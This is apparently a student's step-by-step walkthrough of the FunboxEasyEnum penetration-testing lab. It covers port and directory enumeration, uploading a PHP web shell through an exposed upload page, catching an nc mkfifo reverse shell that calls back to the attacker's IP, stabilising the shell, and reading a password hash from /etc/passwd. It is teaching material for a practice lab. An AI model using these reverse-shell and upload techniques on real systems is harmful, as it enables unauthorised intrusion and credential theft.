@@ -1,0 +1,1963 @@
+
+# FunboxEasyEnum
+
+## About this lab
+
+Employ enumeration and web enumeration techniques to identify vulnerabilities. Engage in bypassing file uploads, along with implementing privilege escalation strategies. Additionally, harness the abuse of sudo permissions to enhance your access. This lab is designed to capitalize on your skills in vulnerability exploitation.
+
+## Learning Objectives
+
+**After completion of this lab, learners will be able to:**
+
+- Perform service discovery and hidden directory enumeration using tools like nmap and gobuster.
+- Exploit a file upload vulnerability in a custom web shell to upload a PHP reverse shell.
+- Enumerate system users and successfully guess a valid password to log in via SSH.
+- Leverage sudo permissions on the mysql binary to execute root-level commands and escalate privileges.
+- Validate root access and retrieve the final flag to complete the lab.
+
+## Lab Description
+
+In this lab, access is gained by exploiting a file upload vulnerability in a web shell, leading to remote code execution. Privilege escalation is performed through password guessing and abusing misconfigured sudo permissions on the mysql binary to execute commands as root. HINTS: Enum without sense, costs you too many time. Use "Daisys best friend" for information gathering. Visit "Karla at home". John and Hydra loves only rockyou.txt Enum/reduce the users to brute force with or brute force the rest of your life. This works better with VirtualBox rather than VMware
+
+
+---------------
+
+WALKTHROUGH
+
+frist well run nmap scans on the target mahcine ip 
+
+geegranl nmap command like 
+
+```
+nmap -p- 192.168.186.132
+```
+tells **Nmap** to scan **all TCP ports** on the host `192.168.186.132`.
+will take up a lop of time 
+
+so o increase the speed of nmap scan , 
+either we can incearse the threads or we can increase the packets speed
+## 1. Increase parallelism ("threads")
+
+Nmap doesn't expose a simple "threads" option, but it uses **parallel probe groups** internally.
+
+Increasing parallelism means Nmap can scan more ports or hosts simultaneously.
+
+Related options:
+
+```
+--min-parallelism
+--max-parallelism
+```
+
+Conceptually:
+
+```
+Without parallelism:
+
+Port 22  ───────► Wait
+Port 80  ───────► Wait
+Port 443 ───────► Wait
+
+With parallelism:
+
+22 ─┐
+80 ─┼──► Sent together
+443─┘
+```
+
+More parallelism usually means a faster scan, provided the network and target can handle it.
+
+---
+
+## 2. Increase packet transmission rate
+
+You can also make Nmap send probes more aggressively.
+
+Common options include:
+
+```
+-T4
+-T5
+```
+
+or more advanced controls such as:
+
+```
+--min-rate
+--max-rate
+```
+
+Conceptually:
+
+```
+Normal
+
+Packet
+     1 second
+Packet
+     1 second
+Packet
+
+Fast
+
+Packet Packet Packet Packet Packet
+```
+
+Higher rates reduce scan time but can:
+
+- Increase packet loss
+- Cause inaccurate results
+- Trigger intrusion detection systems (IDS/IPS)
+- Overload slower targets
+
+------------
+
+so now well run the command : 
+
+```bash
+nmap 192.168.186.132 --min-rate 10000
+```
+
+```bash
+└─$ nmap 192.168.186.132 --min-rate 10000
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 15:43 -0400
+Nmap scan report for 192.168.186.132
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
+```
+
+now we can run the ocmmand 
+
+```bash
+nmap 192.168.186.132 --min-rate 10000 -sV
+```
+
+to see what all versions are runnign on it 
+
+```bash
+└─$ nmap 192.168.186.132 --min-rate 10000 -sV
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 15:46 -0400
+Nmap scan report for 192.168.186.132
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.77 seconds
+```
+
+so noweve found that which all services are runnign in which all ports
+
+now we can also run nmap scripts ont he tsame tager t machien like 
+
+```
+nmap 192.168.186.132 --min-rate 10000 -sV -sC
+```
+
+or we can even write it shorter like 
+
+```
+nmap 192.168.186.132 --min-rate 10000 -sVC
+```
+
+```bash
+└─$ nmap 192.168.186.132 --min-rate 10000 -sVC
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 15:49 -0400
+Nmap scan report for 192.168.186.132
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
+|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
+|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.34 seconds
+```
+
+
+it has foudn ssh keys which are of virtually no use to us 
+
+then we can see that on port 80 there is http apache server runnign tso well copy th eip address 
+`192.168.186.132` and paste it in our browser
+
+```
+http://192.168.232.132/
+```
+
+![](attachments/Pasted%20image%2020260713201618.png)
+
+we can see that is no form and nothing 
+this is justa default page on which there is not much onfiguration
+
+we can rght lcick on the we b page and check the source code of the page as well
+
+![](attachments/Pasted%20image%2020260713223242.png)
+
+![](attachments/Pasted%20image%2020260713223558.png)
+
+
+try to read the comments of the source code aswell 
+al lot of times in comments hidden links migt be stored
+now fromt he source code , we can only figure out one thing that the websote is running inside `/var/www/html/index.html` inside ubuntu using apapche 
+
+we fromt he nmap results also have the apache version i.e `2.4.29 `
+
+
+![](attachments/Pasted%20image%2020260713223822.png)
+
+
+other information in the osurce code is not useful to us 
+
+
+
+
+now we can try directory brute forcing since the link is just an ip address 
+it is possible that tehre might be another wbsite hidden behind it 
+We need to find out if there are hidden directories or files tucked behind this default page
+
+now well use dirbuster to do directory brute ofrcing
+
+To search for hidden folders, we can use directory brute-forcing tools [12]. The first tool is `dirb` [12]. You run it by entering `dirb <target-URL>` [12]. This tool will guess directories by appending words from a default wordlist located at `/usr/share/wordlists/dirb/common.txt` [12]. 
+
+so well run run command 
+
+```
+dirb http://192.168.232.132/
+```
+
+However, `dirb` is extremely slow [12].
+
+ Instead, we can use a much faster tool called **Gobuster** [12]. Gobuster is highly efficient, though it may not be installed by default on every basic Linux machine; you might have to install it [12]. To see its directory brute-forcing options, type `gobuster dir -h` [12].
+
+```bash
+└─$ gobuster
+NAME:
+   gobuster - the tool you love
+
+USAGE:
+   gobuster command [command options]
+
+VERSION:
+   3.8.2
+
+AUTHORS:
+   Christian Mehlmauer (@firefart)
+   OJ Reeves (@TheColonial)
+
+COMMANDS:
+   dir      Uses directory/file enumeration mode
+   vhost    Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)
+   dns      Uses DNS subdomain enumeration mode
+   fuzz     Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
+   tftp     Uses TFTP enumeration mode
+   s3       Uses aws bucket enumeration mode
+   gcs      Uses gcs bucket enumeration mode
+   help, h  Shows a list of commands or help for one command
+
+GLOBAL OPTIONS:
+   --help, -h     show help
+   --version, -v  print the version
+```
+
+we can see from its manual the ocmmand it reuires to run 
+
+`dir` 
+
+now we can even run manual for `dir` commandby 
+
+```
+gobuster dir -h
+```
+
+```bash
+└─$ gobuster dir -h
+NAME:
+   gobuster dir - Uses directory/file enumeration mode
+
+USAGE:
+   gobuster dir [command options] [arguments...]
+
+OPTIONS:
+   --url value, -u value                                    The target URL
+   --cookies value, -c value                                Cookies to use for the requests
+   --username value, -U value                               Username for Basic Auth
+   --password value, -P value                               Password for Basic Auth
+   --follow-redirect, -r                                    Follow redirects (default: false)
+   --headers value, -H value [ --headers value, -H value ]  Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
+   --no-canonicalize-headers, --nch                         Do not canonicalize HTTP header names. If set header names are sent as is (default: false)
+   --method value, -m value                                 the password to the p12 file (default: "GET")
+   --useragent value, -a value                              Set the User-Agent string (default: "gobuster/3.8.2")
+   --random-agent, --rua                                    Use a random User-Agent string (default: false)
+   --proxy value                                            Proxy to use for requests [http(s)://host:port] or [socks5://host:port]
+   --timeout value, --to value                              HTTP Timeout (default: 10s)
+   --no-tls-validation, -k                                  Skip TLS certificate verification (default: false)
+   --retry                                                  Should retry on request timeout (default: false)
+   --retry-attempts value, --ra value                       Times to retry on request timeout (default: 3)
+   --client-cert-pem value, --ccp value                     public key in PEM format for optional TLS client certificates]
+   --client-cert-pem-key value, --ccpk value                private key in PEM format for optional TLS client certificates (this key needs to have no password)
+   --client-cert-p12 value, --ccp12 value                   a p12 file to use for options TLS client certificates
+   --client-cert-p12-password value, --ccp12p value         the password to the p12 file
+   --tls-renegotiation                                      Enable TLS renegotiation (default: false)
+   --interface value, --iface value                         specify network interface to use. Can't be used with local-ip
+   --local-ip value                                         specify local ip of network interface to use. Can't be used with interface
+   --wordlist value, -w value                               Path to the wordlist. Set to - to use STDIN.
+   --delay value, -d value                                  Time each thread waits between requests (e.g. 1500ms) (default: 0s)
+   --threads value, -t value                                Number of concurrent threads (default: 10)
+   --wordlist-offset value, --wo value                      Resume from a given position in the wordlist (default: 0)
+   --output value, -o value                                 Output file to write results to (defaults to stdout)
+   --quiet, -q                                              Don't print the banner and other noise (default: false)
+   --no-progress, --np                                      Don't display progress (default: false)
+   --no-error, --ne                                         Don't display errors (default: false)
+   --pattern value, -p value                                File containing replacement patterns
+   --discover-pattern value, --pd value                     File containing replacement patterns applied to successful guesses
+   --no-color, --nc                                         Disable color output (default: false)
+   --debug                                                  enable debug output (default: false)
+   --status-codes value, -s value                           Positive status codes (will be overwritten with status-codes-blacklist if set). Can also handle ranges like 200,300-400,404
+   --status-codes-blacklist value, -b value                 Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default: "404")
+   --extensions value, -x value                             File extension(s) to search for
+   --extensions-file value, -X value                        Read file extension(s) to search from the file
+   --expanded, -e                                           Expanded mode, print full URLs (default: false)
+   --no-status, -n                                          Don't print status codes (default: false)
+   --hide-length, --hl                                      Hide the length of the body in the output (default: false)
+   --add-slash, -f                                          Append / to each request (default: false)
+   --discover-backup, --db                                  Upon finding a file search for backup files by appending multiple backup extensions (default: false)
+   --exclude-length value, --xl value                       exclude the following content lengths (completely ignores the status). You can separate multiple lengths by comma and it also supports ranges like 203-206
+   --force                                                  Continue even if the prechecks fail. Please only use this if you know what you are doing, it can lead to unexpected results. (default: false)
+   --help, -h                                               show help
+```
+
+
+we can see it says 
+
+```
+OPTIONS:
+   --url value, -u value                                    The target URL
+```
+
+and 
+
+```
+--wordlist value, -w value                               Path to the wordlist. Set to - to use STDIN.
+```
+
+
+
+well also use the `-x` option to specify the extensions like `txt` and `php`
+so that we get those results also 
+
+Wait, by default, Gobuster only searches for directories [13]. It won't find specific files unless we tell it to look for file extensions [13]. Since we know the server is running Apache, we should check for PHP and text files [13]. We can append the `-x` flag followed by the extensions we want to search, like `-x php,txt` [13].
+
+we can choose fromt he vaaibale options 
+
+```bash
+└─$ ls /usr/share/wordlists/dirb                                           
+big.txt     euskera.txt            mutations_common.txt  spanish.txt
+catala.txt  extensions_common.txt  others                stress
+common.txt  indexes.txt            small.txt             vulns
+```
+
+so our cmmand will become 
+we'll usse `big.txt` here
+
+Notice how our total request count tripled because Gobuster is now checking every word in the list with `.php` and `.txt` extensions [14]. Let's wait for the scan to run [15].
+
+
+```
+gobuster dir -u http://192.168.232.132/ -w /usr/share/wordlists/dirb/big.txt -x php,txt
+```
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ gobuster dir -u http://192.168.232.132/ -w /usr/share/wordlists/dirb/big.txt -x php,txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.232.132/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htpasswd.php        (Status: 403) [Size: 280]
+.htpasswd            (Status: 403) [Size: 280]
+.htaccess.php        (Status: 403) [Size: 280]
+.htaccess.txt        (Status: 403) [Size: 280]
+.htaccess            (Status: 403) [Size: 280]
+.htpasswd.txt        (Status: 403) [Size: 280]
+javascript           (Status: 301) [Size: 323] [--> http://192.168.232.132/javascript/]
+mini.php             (Status: 200) [Size: 3828]
+phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.232.132/phpmyadmin/]
+robots.txt           (Status: 200) [Size: 21]
+robots.txt           (Status: 200) [Size: 21]
+server-status        (Status: 403) [Size: 280]
+Progress: 61407 / 61407 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Let's quickly review HTTP Status Codes:
+
+- **200 (OK):** The file or page exists and is accessible [15].
+- **300-399 (Redirect):** The URL redirects to another page [15].
+- **403 (Forbidden):** The directory exists, but we do not have permission to view it [15].
+- **404 (Not Found):** The page does not exist.
+- **500 (Internal Server Error):** Server-side configuration errors [15].
+
+Our Gobuster scan has discovered a couple of interesting files:
+
+well see
+
+`http://192.168.232.132/javascript/`
+
+![](attachments/Pasted%20image%2020260714000342.png)
+
+then we will try 
+
+`http://192.168.232.132/mini.php`
+
+Next, let's navigate to `mini.php` in our browser [15]. It loads a page titled **"Mini Shell"** which contains a file upload form [15]! It also displays some files that are already uploaded on the server, like `main.php` and `robots.txt` [15].
+
+![](attachments/Pasted%20image%2020260714000531.png)
+
+this one is working 
+
+in this we have the directory mentioned as `/var/ww/html` where the files go 
+
+then theres an uplod file option as well
+
+we have here `index.html`  , `mini.php` , `robots.txt` 
+
+Let's check `robots.txt` [15]. As you know, `robots.txt` is a text file that tells web crawlers and search engine bots which directories they are allowed or disallowed from crawling [15-16].
+
+For example, massive sites like Facebook block AI scrapers, Apple bots, or search crawlers in their `robots.txt` [16]. For a hacker, `robots.txt` is a map that often points directly to hidden or sensitive directories [16].
+
+for example , `robots.txt` of claude
+
+![](attachments/Pasted%20image%2020260714001241.png)
+
+though our labs specific there is nothing much 
+
+![](attachments/Pasted%20image%2020260714001830.png)
+
+We have a file upload portal on `mini.php` [16]. What can we upload to this web server that will allow us to execute system commands on the target machine? [16]
+
+now sicne tehre is an uplaod option we have to think what we can uplaokd so as well get an reverse shell back to ourmahcine
+
+so well try to uplaod a reverse shell or web shell
+
+so we just google `php webshell`
+
+![](attachments/Pasted%20image%2020260714002212.png)
+
+and pick up any webshell from here
+
+![](attachments/Pasted%20image%2020260714002236.png)
+
+well copy the ocde
+
+and will come back to my kali machine
+
+a nd will create a new file 
+
+```
+nano webshell.php 
+```
+
+will paste the code 
+
+![](attachments/Pasted%20image%2020260714002345.png)
+
+save and exit 
+ctrl x , y 
+
+no well again go back to our website 
+and uplaod our reverse shell
+
+![](attachments/Pasted%20image%2020260714002456.png)
+
+![](attachments/Pasted%20image%2020260714002536.png)
+
+
+
+
+then again click on uplaod and can see our webshell uplaoded
+
+![](attachments/Pasted%20image%2020260714002620.png)
+
+now well click on our uplaoded file 
+
+![](attachments/Pasted%20image%2020260714002813.png)
+
+but it just prints its contents out 
+
+now if we look closesly at the url bar 
+
+![](attachments/Pasted%20image%2020260714002946.png)
+
+well see the click we went to was not `webshell.php` as it hsould be but it went to `mini.php` which exeucted our file 
+
+but we have to exueute out uplaoded revser shell file indicivudally 
+
+so well modify the url and make it to 
+
+
+```
+http://192.168.232.132/webshell.php
+```
+
+now well get a web shell on the web page
+
+![](attachments/Pasted%20image%2020260714003216.png)
+
+if we try some command like 
+
+`whoami`
+
+it prints
+
+`www-data`
+
+![](attachments/Pasted%20image%2020260714003258.png)
+
+
+The default owner of the Apache web server process is `www-data` [18]. This means we can successfully execute system commands on the target machine through the web browser [18].
+
+ow we can execute `cat /etc/passwd`
+
+![](attachments/Pasted%20image%2020260714003517.png)
+
+we notice there is password hash of a user `oracle`
+
+![](attachments/Pasted%20image%2020260714003622.png)
+
+i.e `$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0`
+
+
+
+However, this web shell is highly unstable [19]. It is great for running quick commands, but you cannot use it to interactively switch users, run programs that require terminal inputs, or elevate your privileges to root [19-20].
+
+for example i cannot do `sudo su` on this webshell and go to another user
+
+
+For a fully interactive terminal, we need to catch a **reverse shell** back to our Kali Linux machine [20-21].
+
+so againw ell search on google for `revshells`
+
+
+![](attachments/Pasted%20image%2020260714003727.png)
+
+and go to `https://www.revshells.com/`
+
+![](attachments/Pasted%20image%2020260714004207.png)
+
+so now it reuqires an ip address to be eneteres
+
+well go back to our etrminal and see our ip address
+
+```
+ip a
+```
+
+and pick up our `tun0` ip address
+
+![](attachments/Pasted%20image%2020260714004325.png)
+
+
+and paste it there
+
+and well also eneter port number
+
+any port number will work 
+
+well enetr for ex,  `4444` here
+
+![](attachments/Pasted%20image%2020260714004527.png)
+
+now well select listenenr setting and select 
+
+`rlwrap+nc`
+
+![407](attachments/Pasted%20image%2020260714004702.png)
+
+
+|Rank|Listener|Use it?|Why|
+|---|---|---|---|
+
+|   |   |   |   |
+|---|---|---|---|
+|⭐⭐⭐⭐⭐|**nc**|**Yes (default)**|Installed on almost every Kali system. Simple, reliable, perfect for OSCP.|
+
+|   |   |   |   |
+|---|---|---|---|
+|⭐⭐⭐⭐⭐|**rlwrap + nc**|**Yes (my favorite)**|Same as `nc`, but gives command history, arrow keys, and a much better interactive shell.|
+
+|   |   |   |   |
+|---|---|---|---|
+|⭐⭐⭐⭐☆|**ncat**|Yes|Modern Netcat from the Nmap suite with extra features like SSL and proxy support.|
+
+## 1. `rlwrap + nc` ⭐⭐⭐⭐⭐ (Best choice)
+
+```
+rlwrap nc -lvnp 4444
+```
+
+### Why?
+
+Normal Netcat looks like this:
+
+```
+$ whoami
+www-data
+$ ls
+index.php
+$ pwd
+/var/www/html
+```
+
+If you press ↑, nothing happens.
+
+With **rlwrap**:
+
+- ✅ Arrow key history
+- ✅ Command editing
+- ✅ Tab completion in some cases
+- ✅ Much nicer experience
+
+This is what I personally recommend for day-to-day lab work.
+
+---
+
+## 2. `nc`
+
+```
+nc -lvnp 4444
+```
+
+Use this if:
+
+- rlwrap isn't installed
+- You're following OSCP material exactly
+- You want the simplest listener
+
+so now well copy the listener ocmmand given 
+
+and run it inside out own attacker terminal 
+
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+now it will startlistneitng 
+
+```
+└─$ rlwrap -cAr nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+now well come back again on our revshells website and select 
+our reverse hsell command 
+
+well choose 
+
+```
+nc mkfifo
+```
+
+![](attachments/Pasted%20image%2020260714005227.png)
+
+
+|Rank|Payload|When to use|Why|
+|---|---|---|---|
+|🥇|**Bash -i**|**First choice**|Works on most Linux systems that have Bash. Simple and reliable.|
+|🥈|**nc -e**|If traditional Netcat supports `-e`|Very clean reverse shell, but many modern Netcat versions disable `-e`.|
+|🥉|**nc mkfifo**|If `nc -e` isn't available|Uses a named pipe (`mkfifo`) to emulate `-e`. Very common fallback.|
+
+
+
+![](attachments/Pasted%20image%2020260714005519.png)
+
+
+## How do you know which one to use?
+
+After getting code execution, enumerate what's installed:
+
+```
+which bash
+which nc
+which ncat
+which python3
+which python
+which perl
+which php
+```
+
+Then choose the appropriate payload.
+
+For example:
+
+- `bash` exists → use **Bash -i**.
+- `nc` exists and supports `-e` → use **nc -e**.
+- `nc` exists but **doesn't** support `-e` → use **nc mkfifo**.
+- Only BusyBox is present → use **BusyBox nc -e**.
+
+so nwo copy teh ocmamnd 
+
+![](attachments/Pasted%20image%2020260714005752.png)
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.246 4444 >/tmp/f
+```
+
+and paste it on our web shell
+
+amd eneter 
+
+![](attachments/Pasted%20image%2020260714005909.png)
+
+now go aback to our listener running on our terminal 
+
+well get a connection back 
+
+```
+└─$ rlwrap -cAr nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.232.132] 48766
+sh: 0: can't access tty; job control turned off
+$ 
+```
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.246 4444 >/tmp/f
+
+This is the classic **Netcat `mkfifo` reverse shell**. It's used when the target has `nc` installed **but its Netcat version does not support the `-e` option**.
+
+Let's break it down step by step:
+
+```
+rm /tmp/f;
+mkfifo /tmp/f;
+cat /tmp/f | sh -i 2>&1 | nc 192.168.45.246 4444 >/tmp/f
+```
+
+---
+
+## Step 1
+
+```
+rm /tmp/f
+```
+
+Deletes any existing file or named pipe called `/tmp/f`.
+
+Why?
+
+If `/tmp/f` already exists, `mkfifo` will fail.
+
+---
+
+## Step 2
+
+```
+mkfifo /tmp/f
+```
+
+Creates a **named pipe (FIFO)**.
+
+Think of it as a special file that allows two processes to communicate.
+
+```
+Process A  <------>  /tmp/f  <------>  Process B
+```
+
+Unlike a normal file, it doesn't store data permanently.
+
+---
+
+## Step 3
+
+```
+cat /tmp/f
+```
+
+Reads everything written into the FIFO.
+
+Initially it blocks, waiting for input.
+
+---
+
+## Step 4
+
+```
+cat /tmp/f | sh -i
+```
+
+Everything coming from the FIFO becomes input to an interactive shell.
+
+Example:
+
+```
+FIFO receives:
+whoami
+
+↓
+
+sh executes:
+whoami
+```
+
+---
+
+## Step 5
+
+```
+2>&1
+```
+
+Redirects **stderr** to **stdout**.
+
+Normally:
+
+```
+stdout → normal output
+stderr → errors
+```
+
+Without this:
+
+```
+ls
+No such file...
+```
+
+you would never receive the error.
+
+So now both go over the reverse shell.
+
+---
+
+## Step 6
+
+```
+| nc 192.168.45.246 4444
+```
+
+The shell output is sent to Netcat.
+
+Netcat connects back to:
+
+```
+192.168.45.246
+Port 4444
+```
+
+which is your Kali listener.
+
+---
+
+## Step 7
+
+```
+>/tmp/f
+```
+
+Everything received **from your Netcat listener** is written back into the FIFO.
+
+```
+Kali types:
+
+id
+
+↓
+
+Netcat receives
+
+↓
+
+writes to /tmp/f
+
+↓
+
+cat reads /tmp/f
+
+↓
+
+sh executes id
+
+↓
+
+Output returns through nc
+```
+
+---
+
+# Complete Data Flow
+
+```
+           Kali
+     nc -lvnp 4444
+            ▲
+            │
+            │
+        Netcat
+            ▲
+            │
+      stdout/stderr
+            ▲
+            │
+        sh -i
+            ▲
+            │
+      cat /tmp/f
+            ▲
+            │
+       Named Pipe
+        (/tmp/f)
+            ▲
+            │
+      nc receives commands
+```
+
+It forms a continuous loop.
+
+# Why use this instead of `nc -e`?
+
+Some Netcat versions support:
+
+```
+nc -e /bin/sh attacker 4444
+```
+
+But many modern versions remove the `-e` option for security reasons.
+
+The FIFO technique recreates the same functionality without relying on `-e`.
+
+## Easy way to remember it
+
+Think of it as creating a loop:
+
+```
+Your Keyboard
+      ↓
+Netcat
+      ↓
+FIFO
+      ↓
+Shell
+      ↓
+Output
+      ↓
+Netcat
+      ↓
+Your Screen
+```
+
+The named pipe (`/tmp/f`) is simply the bridge that lets Netcat and the shell exchange data in both directions. This is why the `mkfifo` reverse shell is such a common fallback when `nc -e` isn't available.
+
+
+--------
+
+
+but now in our revers eshell we can see that we still hhavent got a stable hsell
+
+so if we try to run 
+
+```
+sudo -l
+```
+
+well see that
+
+```
+$ sudo -l
+sudo: no tty present and no askpass program specified
+```
+
+It **does not** mean you don't have sudo privileges. It means **`sudo` needs an interactive terminal (TTY)** to prompt for a password, but your current shell doesn't have one.
+
+since we has used `rlwrap` we can use arrow keys also here 
+by scrollign through up and down commands
+
+now well eneter command 
+
+```
+bash -i
+```
+
+this will toggle interactive shell of bash
+
+```
+└─$ rlwrap -cAr nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.153.132] 41850
+sh: 0: can't access tty; job control turned off
+$ sudo -l
+sudo: no tty present and no askpass program specified
+$ bash -i
+bash: cannot set terminal process group (1332): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@funbox7:/var/www/html$ 
+```
+
+now weve got an interractive hsell
+
+well now upgrade it to an stable shell
+
+for that we again go and serach on our browser
+
+and go to HackTools extnesions
+
+and go to tty spawnshell option 
+
+it gives all the steps to stabilize our shell
+
+
+![](attachments/Pasted%20image%2020260714104847.png)
+
+All the steps to stabilize your shell
+The first step:
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys.
+
+
+
+Step two is:
+
+```
+export TERM=xterm
+```
+
+This will give us access to term commands such as `clear` .
+
+![](attachments/Pasted%20image%2020260714105028.png)
+
+
+Finally (and most importantly) we will background the shell using
+
+```
+Ctrl + Z
+```
+
+
+
+Back in our own terminal we use
+
+```
+stty raw -echo; fg
+```
+
+This does two things: first, it turns off our own terminal echo which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes
+
+so basically ctrl +z will background the shell and then `stty raw -echo; fg` in terminal will bring our shell back whenever we need it 
+
+![](attachments/Pasted%20image%2020260714105104.png)
+
+now we finally have a fully stable shell
+
+now well try 
+
+```
+sudo -l
+```
+
+```
+www-data@funbox7:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for www-data: 
+
+Sorry, try again.
+[sudo] password for www-data: 
+
+Sorry, try again.
+[sudo] password for www-data: 
+
+sudo: 3 incorrect password attempts
+www-data@funbox7:/var/www/html$ 
+```
+
+since its asking for password and we dont have the password , well just keep pressing enter until we are prompted out 
+
+currently i am user `www-data` which is a low privelge user
+
+so first well do 
+
+```
+cat /etc/passwd
+```
+
+to see how many users i have
+
+```
+www-data@funbox7:/var/www/html$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+karla:x:1000:1000:karla:/home/karla:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+harry:x:1001:1001:,,,:/home/harry:/bin/bash
+sally:x:1002:1002:,,,:/home/sally:/bin/bash
+goat:x:1003:1003:,,,:/home/goat:/bin/bash
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+lissy:x:1005:1005::/home/lissy:/bin/sh
+```
+
+we have , `root` `goat` `sally` `harry` `oracle` `lissy`
+
+but for user oracle we can see the password hash 
+
+```
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+```
+
+i.e hash is 
+
+```
+$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
+```
+
+this is a miscofniguration 
+
+we can try to crack the hash
+
+idelllay instead of password hash , it should be `:x:` which means that user is paswor dproetcted 
+
+|Field|Value|Meaning|
+|---|---|---|
+|Username|`oracle`|User account name|
+|Password|`$1$|O@GOeN$PGb9VNu29e9s6dMNJKH/R0`|
+|UID|`1004`|User ID|
+|GID|`1004`|Primary Group ID|
+|GECOS|`,, ,`|User information (empty)|
+|Home Directory|`/home/oracle`|User's home directory|
+|Shell|`/bin/bash`|Login shell|
+
+### The interesting part
+
+```
+$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
+```
+
+The `$1$` prefix indicates an **MD5-Crypt** password hash.
+
+Format:
+
+```
+$id$salt$hash
+```
+
+Where:
+
+- `$1$` → MD5-Crypt
+- `|O@GOeN\` → Salt (the `\` is likely an escaped character from the source)
+- `PGb9VNu29e9s6dMNJKH/R0` → Password hash
